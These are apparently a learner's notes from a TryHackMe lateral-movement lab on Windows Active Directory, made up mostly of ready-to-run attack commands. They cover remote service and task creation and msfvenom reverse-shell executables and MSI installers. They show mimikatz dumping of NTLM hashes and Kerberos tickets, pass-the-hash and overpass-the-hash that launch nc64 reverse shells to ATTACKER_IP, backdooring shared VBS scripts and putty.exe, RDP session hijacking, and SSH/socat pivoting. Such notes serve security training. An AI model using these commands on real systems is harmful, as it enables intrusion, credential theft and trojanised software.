- [Spawning Processes Remotely:](#spawning-processes-remotely-)
    + [Psexec](#psexec)
    + [Remote Process Creation Using WinRM:](#remote-process-creation-using-winrm-)
    + [Remotely Creating Services Using sc](#remotely-creating-services-using-sc)
    + [Creating Scheduled Tasks Remotely](#creating-scheduled-tasks-remotely)
    + [==Practical Example==](#--practical-example--)
- [Moving Laterally Using WMI:](#moving-laterally-using-wmi-)
    + [Connecting to WMI From Powershell](#connecting-to-wmi-from-powershell)
    + [Remote Process Creating Using WMI](#remote-process-creating-using-wmi)
    + [Creating Services Remotely with WMI](#creating-services-remotely-with-wmi)
    + [Creating Schedule Tasks Remotely with WMI](#creating-schedule-tasks-remotely-with-wmi)
    + [Installing MSI Packages through WMI](#installing-msi-packages-through-wmi)
    + [==Practical Example==](#--practical-example---1)
- [Use of Alternate Authentication Material](#use-of-alternate-authentication-material)
    + [Pass-the-Hash [NTLM Authentication]](#pass-the-hash--ntlm-authentication-)
    + [Passing the Hash Using Linux](#passing-the-hash-using-linux)
    + [Pass-the-Ticket [Kerberos Authentication]](#pass-the-ticket--kerberos-authentication-)
    + [Overpass-the-Hash / Pass-the-Key](#overpass-the-hash---pass-the-key)
- [Abusing User Behavior](#abusing-user-behavior)
    + [Abusing Writable Shares](#abusing-writable-shares)
    + [RDP Hijacking](#rdp-hijacking)
- [Port Forwarding](#port-forwarding)
    + [SSH Tunnelling](#ssh-tunnelling)
    + [SSH Remote Port Forwarding](#ssh-remote-port-forwarding)
    + [SSH Local Port Forwarding](#ssh-local-port-forwarding)
    + [Port Forwarding with socat](#port-forwarding-with-socat)
    + [Dynamic Port Forwarding and SOCKS](#dynamic-port-forwarding-and-socks)

---
## Spawning Processes Remotely:

#### Psexec

Psexec has been the go-to method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded

- Ports: 445/TCP (SMB)
- Required Group Memberships: Administrators

```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

#### Remote Process Creation Using WinRM:

Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

- Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Remote Management Users

To connect to a remote Powershell session from the command line, we can use the following command:

```
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

#### Remotely Creating Services Using sc

Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.

- Ports:
	- 135/TCP, 49152-65535/TCP (DCE/RPC)
	- 445/TCP (RPC over SMB Named Pipes)
	- 139/TCP (RPC over SMB Named Pipes)
- Required Group Memberships: Administrators

We can create and start a service named "THMservice" using the following command:

```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto

sc.exe \\TARGET start THMservice

# Additionally, we can stop and delete the service

sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

#### Creating Scheduled Tasks Remotely

Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks, available in any Windows installation.

```
# Starting and running a scheduled task:

schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1"

# Deleting a scheduled task:

schtasks /S TARGET /TN "THMtask1" /DELETE /F

```

- /sc - schedule type (ONCE indicates that the task will run only once at the specified time and date)
- /sd - starting date
- /st - starting time

#### ==Practical Example==

1. Creating a reverse shell executable

```
$ msfvenom -p windows/shell/reverse_tcp -f exe LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

2. Upload exe to the ADMIN$ share using valid credentials and smbclient

```
smbclient -c 'put myservice.exe' -U <user> -W <domain> '//VICTIM_IP/admin$/' <password>
```

3. Setup a listener to receive reverse shell

```
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT 4444;exploit"
```

4.  Using currently comprimised victim machine to create a new service remotely by using sc, associating it with our uploaded exe

```
C:\> sc.exe \\VICTIM_IP create mal-service binPath= "%windir%\myservice.exe" start= auto

C:\> sc.exe \\VICTIM_IP start mal-service

# You will notice that you get access denied
# This is because sc.exe does not give us a way to input valid credentials for the target_machine
# We have to spawn a new command prompt as the user we have credentials for first
# Using runas to spawn a shell on a port we are listening on

Attacker Machine:
$ nc -nvlp 4443

Compromised Machine:
C:\> runas /netonly /user:DOMAIN\user.name "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"

# Now we can create and start our service with our escalated shell
```

---

## Moving Laterally Using WMI:

#### Connecting to WMI From Powershell

WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways, which we'll discuss.

```powershell
# Creating PSCredential Object with our user and password
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We then proceed to establish a WMI session using either of the following protocols:

- DCOM: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP
- Wsman: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

```powershell
# Establish a WMI session and storing it in $Session variable
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

#### Remote Process Creating Using WMI

- Ports:
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators

```powershell
# Remotely spawning a process
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

#### Creating Services Remotely with WMI

- Ports:
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators

```powershell
# Creating service "THMService2" with WMI
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}

# Handle the service and start it
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stopping and deleting service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

#### Creating Schedule Tasks Remotely with WMI

- Ports:
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators

```powershell
# Creating and executing scheduled tasks
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"

# Deleting scheduled task after use
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

#### Installing MSI Packages through WMI

What is MSI?

MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:

- Ports:
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators

```powershell
# Installing MSI file
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

#### ==Practical Example==

1. Create a reverse shell MSI file

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f msi > myinstaller.msi
```

2. Upload the payload to the ADMIN$ share with smbclient and valid credentials

```
# Note: anything uploaded to the ADMIN$ share will be in C:\Windows\

$ smbclient -c 'put myinstaller.msi' -U <user> -W <domain> '//VICTIM_IP/admin$/' <pass>
```

3. Start listening on our declared port

```
msf6 exploit(multi/handler) > set LHOST ATTACKER_IP
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > run
```

4. Start a WMI session against our target machine

```powershell
PS C:\> $username = 'user.name';
PS C:\> $password = 'Password';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

5. Invoke the install method from the Win32_Product class to trigger payload

```powershell
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

---

## Use of Alternate Authentication Material

#### Pass-the-Hash [NTLM Authentication]

Extracting NTLM hashes from local SAM

```
# This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.

mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

Extracting NTLM hashes from LSASS memory

```
# This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.

mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```

Using the extracted hashes to pass-the-hash using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like)

```
# token::revert reestablishes our original token privileges, as trying to P-t-H with an elevated token won't work.

mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

#### Passing the Hash Using Linux

Connect to RDP using PtH

```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\User.Name /pth:NTLM_HASH
```

Connect via psexec using PtH

```
# Only the linux version of psexec supports PtH

psexec.py -hashes NTLM_HASH DOMAIN/User.Name@VICTIM_IP
```

Connect to WinRM using PtH

```
evil-winrm -i VICTIM_IP -u User.Name -H NTLM_HASH
```


#### Pass-the-Ticket [Kerberos Authentication]

Extracting Kerberos tickets and session keys from LSASS memory using mimikatz

```
# This process usually requires us to have SYSTEM privileges on the attacked machine
# Notice that if we only had access to a ticket but not its corresponding session key, we wouldn't be able to use that ticket; therefore, both are necessary

mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

**_NOTE:_ 
While mimikatz can extract any TGT or TGS available from the memory of the LSASS process, most of the time, we'll be interested in TGTs as they can be used to request access to any services the user is allowed to access. At the same time, TGSs are only good for a specific service. Extracting TGTs will require us to have administrator's credentials, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account).

Using our extracted ticket to inject into the current session

```
# Injecting tickets in our own session does not require administrator privileges
# This will make the tickets available for any tools we use for lateral movement

mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi

```

Checking if the tickers were correctly injected

```
C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

#### Overpass-the-Hash / Pass-the-Key

**_NOTE:_
This kind of attack is similar to PtH but applied to Kerberos networks.
When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (disabled by default on current Windows versions), RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name Pass-the-key (PtK).

Obtaining the Kerberos encryption keys from memory by using mimikatz

```
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

If we have the RC4 hash

```
# Notice that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as Overpass-the-Hash (OPtH).

mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

If we have the AES128 hash

```
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

If we have the AES256 hash

```
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

---

## Abusing User Behavior

#### Abusing Writable Shares

Backdooring .vbs Scripts

```
#  if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script
# This will copy nc64.exe from the share to the user's workstation %tmp% directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.

CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\share\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

Backdooring .exe Files

```
# If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently.

msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

#### RDP Hijacking

When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:

Open cmd.exe via "Run as administrator" and then spawn a cmd prompt as SYSTEM

```
Psexec64.exe -s cmd.exe
```

Then, we can list existing sessions on a server

```
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 t1_toby.beck4                             2  Disc            3  1/11/2023 12:27 AM
 t1_toby.beck5                             3  Disc            3  1/11/2023 12:27 AM
 t1_toby.beck                              4  Disc            4  1/11/2023 12:36 AM
 t1_toby.beck1                             5  Disc            4  1/11/2023 12:36 AM
 t1_toby.beck2                             6  Disc            4  1/11/2023 12:36 AM
 t1_toby.beck3                             7  Disc            3  1/11/2023 12:37 AM
 barbara.taylor                            8  Disc            1  1/11/2023 1:06 AM
 t2_kelly.blake        rdp-tcp#29          9  Active          .  1/11/2023 1:09 AM
```

- Disc state - indicates a session that has been left open by the user and isn't being used at the moment
- Active state - indicates an active session (Taking over an active session will force out the legitimate user)

Connect to a session, specifying session ID and current SESSIONNAME

```
tscon 3 /dest:rdp-tcp#29
```

**_Note:_
Windows Server 2019 won't allow you to connect to another user's session without knowing its password.

---

## Port Forwarding

#### SSH Tunnelling

SSH Tunnelling can be used in different ways to forward ports through an SSH connection, which we'll use depending on the situation. To explain each case, let's assume a scenario where we've gained control over the PC-1 machine (it doesn't need to be administrator access) and would like to use it as a pivot to access a port on another machine to which we can't directly connect. We will start a tunnel from the PC-1 machine, acting as an SSH client, to the Attacker's PC, which will act as an SSH server. The reason to do so is that you'll often find an SSH client on Windows machines, but no SSH server will be available most of the time.

Since we'll be making a connection back to our attacker's machine, we'll want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels:

```bash
useradd tunneluser -m, -d /home/tunneluser -s /bin/true
passwd tunneluser
```

#### SSH Remote Port Forwarding

![[remotesshportfwd.png]]

- We want access to port 3389 (RDP) on the server (3.3.3.3)
- Our ATTACKER_PC (1.1.1.1) does not have access to the server's port, but the compromised machine (PC-1) does
- We do an SSH remote port forward into our ATTACKER_PC from PC-1 to access 3.3.3.3:3389

```
C:\>ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N

# Establishes an SSH session from PC-1 (2.2.2.2) to ATTACKER_PC (1.1.1.1) using the tunneluser user
# tunneluser isn't allowed to run a shell on ATTACKER_PC, thus using -N to prevent the client from requesting one, or the connection will exit immediately
# -R This requests a remote port forward, we then give it a port we will be opening at the SS server (3389), followed by the IP nad port of the socket we'll be forwarding (3.3.3.3:3389)
```

Our tunnel is set, lets RDP into 3.3.3.3 via our ATTACKER_PC

```bash
xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

#### SSH Local Port Forwarding

Local port forwarding allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on PC-1. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.

![[localsshportfwd.png]]

- We want the server (3.3.3.3) to be able to reach our ATTACKER_PC via port 80
- We local port forward our port onto PC-1 (2.2.2.2)

```
C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N

# -L This options is for local port forwarding, we then give it a local socket used by PC-1 to receive connections (*:80) and the remote socket to connect to from the ATTACKER_PC perspective (127.0.0.1:80)
```

Opening a new port on PC-1 may require us to add a firewall rule to allow for incoming connection. Administrative privileges are needed for this

```
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

Once your tunnel is set up, any user pointing their browsers to PC-1 at http://2.2.2.2:80 and see the website published by the attacker's machine.

#### Port Forwarding with socat

In situations where SSH is not available, socat can be used to perform similar functionality. While not as flexible as SSH, socat allows you to forward ports in a much simpler way. One of the disadvantages of using socat is that we need to transfer it to the pivot host (PC-1 in our current example), making it more detectable than SSH, but it might be worth a try where no other option is available.

Accessing port 3389 on ther server using PC-1 as a pivot

```
C:\> socat TCP4-LISTEN:3389,fork TCP4:3.3.3.33389

# Note: socat can't forward the connection directly to the attacker's machine as SSH did but will open a port on PC-1 that the attacker's machine can then connect to
```

![[socatportfwd.png]]

Once again, a new port is opened on the pivot host, we might need to create a firewall rule too allow any connection to that port

```
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

We can expose port 80 from the ATTACKER_PC onto the pivot host so that it is reachable by the server

```
C:\> socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

![[socatlocalportfwd.png]]

#### Dynamic Port Forwarding and SOCKS

While single port forwarding works quite well for tasks that require access to specific sockets, there are times when we might need to run scans against many ports of a host, or even many ports across many machines, all through a pivot host. In those cases, dynamic port forwarding allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a SOCKS proxy

Since we don't want to rely on an SSH server existing on the Windows machines in our target network, we will normally use the SSH client to establish a reverse dynamic port forwarding with the following command:

```
C:\> ssh tunneluser@1.1.1.1 -R 9050 -N

# The SSH server (ATT_PC 1.1.1.1) will start a SOCKS proxy on port 9050, and forward any connection request through the SSH tunne, where they are finally proxied by the SSH client
```

The most interesting part is that we can easily use any of our tools through the SOCKS proxy by using proxychains. To do so, we first need to make sure that proxychains is correctly configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at `/etc/proxychains.conf` on your AttackBox. If we scroll down to the end of the configuration file, we should see a line that indicates the port in use for socks proxying

```
[ProxyList]
socks4 127.0.0.1 9050
```

The default port is 9050, but any port will work as long as it matches the one we used when establishing the SSH tunnel

We now can execute any command through the proxy with proxychains

```
proxychains curl http://pxeboot.za.tryhackme.com
```

**_Note:_
Some software like nmap might not work well with SOCKS in some circumstances, and might show altered results, so your mileage might vary












